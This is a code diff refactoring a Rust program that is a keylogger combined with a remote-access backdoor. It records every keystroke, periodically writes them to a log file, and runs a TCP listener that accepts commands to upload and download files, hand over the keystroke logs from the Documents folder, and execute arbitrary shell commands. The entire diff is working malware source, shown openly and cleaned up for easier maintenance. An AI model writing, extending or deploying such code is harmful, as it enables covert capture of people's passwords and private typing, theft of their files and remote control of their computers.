@@ -15,31 +15,11 @@ use utils::transfer_files::{receive_file, send_file, send_folder};
 
 fn main() -> std::io::Result<()> {
     let listener = TcpListener::bind("127.0.0.1:8080").unwrap();
-
-    // Arc and Mutex to share the stream between the main thread and the keylogger
     let stream_mutex = Arc::new(Mutex::new(None::<TcpStream>));
-
-    // Shared keystroke log buffer
     let keystroke_log = Arc::new(Mutex::new(String::new()));
 
-    // Clone the Arc for the keylogger thread
-    let log_clone = Arc::clone(&keystroke_log);
-
-    // Start keylogger in a separate thread
-    thread::spawn(move || {
-        if let Err(error) = listen(move |event| {
-            if let EventType::KeyPress(key) = event.event_type {
-                let key_str = format!("{:?}", key);
-
-                // Append captured key to the keystroke log buffer
-                let mut log_data = log_clone.lock().unwrap();
-                log_data.push_str(&key_str);
-                log_data.push('\n');
-            }
-        }) {
-            eprintln!("Error: {:?}", error);
-        }
-    });
+    start_keylogger_thread(Arc::clone(&keystroke_log));
+    start_log_writer_thread(Arc::clone(&keystroke_log));
 
     // Start logging to a file at regular intervals
     let log_clone = Arc::clone(&keystroke_log);
@@ -58,33 +38,57 @@ fn main() -> std::io::Result<()> {
         }
     });
 
-    // Main server loop
     for stream in listener.incoming() {
-        match stream {
-            Ok(stream) => {
-                let stream_clone = Arc::clone(&stream_mutex);
-                {
-                    // Lock the stream and update it with the new incoming connection
-                    let mut locked_stream = stream_clone.lock().unwrap();
-                    *locked_stream = Some(stream.try_clone().unwrap());
-                }
+        if let Ok(stream) = stream {
+            let stream_clone = Arc::clone(&stream_mutex);
+            set_shared_stream(stream_clone, &stream)?;
 
-                if let Err(e) = process_stream(stream) {
-                    eprintln!("Failed to process {}", e);
-                }
+            if let Err(e) = handle_client(stream) {
+                eprintln!("Failed to process client: {}", e);
             }
-            Err(e) => {
-                eprintln!("Failed to process {}", e);
-            }
+        } else {
+            eprintln!("Failed to accept connection.");
         }
     }
 
     Ok(())
 }
 
-fn process_stream(mut stream: TcpStream) -> io::Result<()> {
-    let mut buffer = [0; 1204];
+fn start_keylogger_thread(log: Arc<Mutex<String>>) {
+    thread::spawn(move || {
+        if let Err(error) = listen(move |event| {
+            if let EventType::KeyPress(key) = event.event_type {
+                let mut log_data = log.lock().unwrap();
+                log_data.push_str(&format!("{:?}\n", key));
+            }
+        }) {
+            eprintln!("Keylogger error: {:?}", error);
+        }
+    });
+}
 
+fn start_log_writer_thread(log: Arc<Mutex<String>>) {
+    thread::spawn(move || loop {
+        thread::sleep(Duration::from_secs(10));
+
+        let mut log_data = log.lock().unwrap();
+        if !log_data.is_empty() {
+            if let Err(e) = append_to_log(&log_data) {
+                eprintln!("Log writing error: {}", e);
+            }
+            log_data.clear();
+        }
+    });
+}
+
+fn set_shared_stream(mutex: Arc<Mutex<Option<TcpStream>>>, stream: &TcpStream) -> io::Result<()> {
+    let mut locked_stream = mutex.lock().unwrap();
+    *locked_stream = Some(stream.try_clone()?);
+    Ok(())
+}
+
+fn handle_client(mut stream: TcpStream) -> io::Result<()> {
+    let mut buffer = [0; 1024];
     loop {
         let n = stream.read(&mut buffer)?;
         if n == 0 {
@@ -93,39 +97,56 @@ fn process_stream(mut stream: TcpStream) -> io::Result<()> {
         }
 
         let message = String::from_utf8_lossy(&buffer[..n]);
-
-        if message.starts_with("upload") {
-            let filename = message
-                .split_whitespace()
-                .nth(1)
-                .expect("No file name provided");
-            receive_file(&mut stream, filename)?;
-        } else if message.starts_with("download") {
-            let filename = message
-                .split_whitespace()
-                .nth(1)
-                .expect("No file name provided");
-            send_file(&mut stream, filename)?;
-        } else if message.starts_with("keylogs") {
-            let mut folder_path =
-                dirs::document_dir().expect("Could not find user's Documents directory");
-            folder_path.push("Logs");
-            if let Some(folder_str) = folder_path.to_str() {
-                send_folder(&mut stream, folder_str)?;
-            } else {
-                eprintln!("Error: Could not convert folder path to string.");
-            }
-        } else {
-            let response = match execute_command(&message) {
-                Ok(result) => result,
-                Err(e) => {
-                    format!("Error executing command: {}\n", e)
-                }
-            };
-            stream.write_all(response.as_bytes())?;
+        if let Err(e) = handle_message(&mut stream, &message) {
+            eprintln!("Error handling message '{}': {}", message, e);
         }
     }
     Ok(())
+}
+
+fn handle_message(stream: &mut TcpStream, message: &str) -> io::Result<()> {
+    match message.trim().split_whitespace().next() {
+        Some("upload") => handle_upload(stream, message),
+        Some("download") => handle_download(stream, message),
+        Some("keylogs") => handle_keylogs(stream),
+        _ => handle_command(stream, message),
+    }
+}
+
+fn handle_upload(stream: &mut TcpStream, message: &str) -> io::Result<()> {
+    let filename = message
+        .split_whitespace()
+        .nth(1)
+        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "No file name provided"))?;
+    receive_file(stream, filename)
+}
+
+fn handle_download(stream: &mut TcpStream, message: &str) -> io::Result<()> {
+    let filename = message
+        .split_whitespace()
+        .nth(1)
+        .ok_or_else(|| io::Error::new(io::ErrorKind::InvalidInput, "No file name provided"))?;
+    send_file(stream, filename)
+}
+
+fn handle_keylogs(stream: &mut TcpStream) -> io::Result<()> {
+    let mut folder_path = dirs::document_dir().expect("Could not find user's Documents directory");
+    folder_path.push("Logs");
+
+    if let Some(folder_str) = folder_path.to_str() {
+        send_folder(stream, folder_str)
+    } else {
+        eprintln!("Failed to convert folder path to string.");
+        Ok(())
+    }
+}
+
+fn handle_command(stream: &mut TcpStream, message: &str) -> io::Result<()> {
+    let response = match execute_command(message) {
+        Ok(result) => result,
+        Err(e) => format!("Command execution error: {}\n", e),
+    };
+    stream.write_all(response.as_bytes())
 }
 
 fn execute_command(message: &str) -> io::Result<String> {
